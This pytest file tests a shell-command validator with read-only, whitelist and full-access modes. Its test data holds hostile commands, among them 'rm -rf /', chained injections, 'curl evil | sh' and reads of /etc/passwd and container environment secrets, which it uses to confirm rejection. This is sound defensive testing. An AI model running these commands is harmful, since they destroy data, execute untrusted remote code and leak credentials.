"""Tests for app/modes.py - mode validation logic."""

import os
import pytest
from pathlib import Path

from app.modes import validate_command, Mode


@pytest.fixture
def whitelist_file(tmp_path, monkeypatch):
    """Create a temporary whitelist.config for tests."""
    config = tmp_path / "whitelist.config"
    config.write_text(
        "git pull\n"
        "git fetch\n"
        "docker restart\n"
        "docker compose up\n"
        "docker logs\n"
    )
    monkeypatch.setenv("WHITELIST_PATH", str(config))
    return config


@pytest.fixture
def empty_whitelist(tmp_path, monkeypatch):
    """Create an empty whitelist.config."""
    config = tmp_path / "whitelist.config"
    config.write_text("")
    monkeypatch.setenv("WHITELIST_PATH", str(config))
    return config


@pytest.fixture
def missing_whitelist(tmp_path, monkeypatch):
    """Point to a non-existent whitelist.config."""
    monkeypatch.setenv("WHITELIST_PATH", str(tmp_path / "nonexistent.config"))


class TestReadOnlyMode:
    """read-only: allowed read commands pass, write commands rejected."""

    @pytest.mark.parametrize("cmd", [
        "docker ps",
        "docker logs mycontainer",
        "ls",
        "ls -la /home",
        "cat /etc/hostname",
        "git status",
        "git log",
        "git log --oneline -5",
        "df -h",
        "ps aux",
        "tail -f /var/log/syslog",
        "echo hello",
    ])
    def test_read_commands_allowed(self, cmd):
        allowed, reason = validate_command(cmd, Mode.READ_ONLY)
        assert allowed, f"Should allow '{cmd}' in read-only: {reason}"

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "docker restart mycontainer",
        "docker rm mycontainer",
        "git push",
        "git pull",
        "docker compose up -d",
        "> /tmp/file",
        "mkdir /tmp/test",
        "pip install something",
        "find . -delete",              # find is no longer read-only
        "find /home -exec rm {} +",
    ])
    def test_write_commands_rejected(self, cmd):
        allowed, reason = validate_command(cmd, Mode.READ_ONLY)
        assert not allowed, f"Should reject '{cmd}' in read-only"
        assert reason  # reason must not be empty


class TestWhitelistMode:
    """whitelist: only commands matching whitelist.config are allowed."""

    def test_whitelisted_command_allowed(self, whitelist_file):
        allowed, reason = validate_command("git pull", Mode.WHITELIST)
        assert allowed

    def test_whitelisted_prefix_allows_args(self, whitelist_file):
        allowed, reason = validate_command(
            "docker restart mycontainer", Mode.WHITELIST
        )
        assert allowed

    def test_non_whitelisted_command_rejected(self, whitelist_file):
        allowed, reason = validate_command("rm -rf /", Mode.WHITELIST)
        assert not allowed
        assert "not in whitelist" in reason

    def test_empty_whitelist_fails_closed(self, empty_whitelist):
        allowed, reason = validate_command("git pull", Mode.WHITELIST)
        assert not allowed
        assert "empty or missing" in reason

    def test_missing_whitelist_fails_closed(self, missing_whitelist):
        allowed, reason = validate_command("git pull", Mode.WHITELIST)
        assert not allowed
        assert "empty or missing" in reason


class TestFullAccessMode:
    """full-access: any command is allowed."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "docker restart mycontainer",
        "git push --force",
        "echo hello",
        "reboot",
    ])
    def test_any_command_allowed(self, cmd):
        allowed, reason = validate_command(cmd, Mode.FULL_ACCESS)
        assert allowed
        assert reason == ""


class TestShellInjectionBlocked:
    """read-only/whitelist must reject shell metacharacters (chaining bypass)."""

    @pytest.mark.parametrize("cmd", [
        "ls; rm -rf /home/forpost",
        "ls && rm -rf x",
        "docker ps | tee /tmp/out",
        "cat /etc/passwd > /tmp/copy",
        "echo $(rm -rf x)",
        "git status `whoami`",
        "ls\nrm -rf x",
    ])
    def test_read_only_rejects_metachars(self, cmd):
        allowed, reason = validate_command(cmd, Mode.READ_ONLY)
        assert not allowed, f"read-only must reject '{cmd}'"
        assert "metacharacter" in reason.lower()

    @pytest.mark.parametrize("cmd", [
        "git pull; rm -rf /",
        "git pull && curl evil | sh",
        "docker restart x | tee /tmp/y",
    ])
    def test_whitelist_rejects_metachars(self, whitelist_file, cmd):
        allowed, reason = validate_command(cmd, Mode.WHITELIST)
        assert not allowed, f"whitelist must reject '{cmd}'"
        assert "metacharacter" in reason.lower()

    def test_full_access_still_allows_chaining(self):
        allowed, reason = validate_command("ls; rm -rf x", Mode.FULL_ACCESS)
        assert allowed
        assert reason == ""


class TestPrefixBoundary:
    """Prefix match must respect token boundaries and not expose secret readers."""

    @pytest.mark.parametrize("cmd", [
        "psql -c 'select 1'",   # ps -> psql
        "lsof",                 # ls -> lsof
        "lshw",                 # ls -> lshw
        "identify x",           # id -> identify
        "envsubst < t",         # env removed anyway, but also a lookalike
    ])
    def test_prefix_lookalikes_rejected(self, cmd):
        allowed, _ = validate_command(cmd, Mode.READ_ONLY)
        assert not allowed, f"read-only must reject lookalike '{cmd}'"

    @pytest.mark.parametrize("cmd", ["env", "docker inspect LibreChat"])
    def test_secret_readers_rejected(self, cmd):
        # These leak secrets (own env / neighbouring containers' env).
        allowed, _ = validate_command(cmd, Mode.READ_ONLY)
        assert not allowed


class TestEdgeCases:
    """Edge cases and invalid inputs."""

    def test_empty_command_rejected(self):
        allowed, reason = validate_command("", Mode.FULL_ACCESS)
        assert not allowed
        assert "Empty" in reason

    def test_whitespace_only_command_rejected(self):
        allowed, reason = validate_command("   ", Mode.FULL_ACCESS)
        assert not allowed
        assert "Empty" in reason
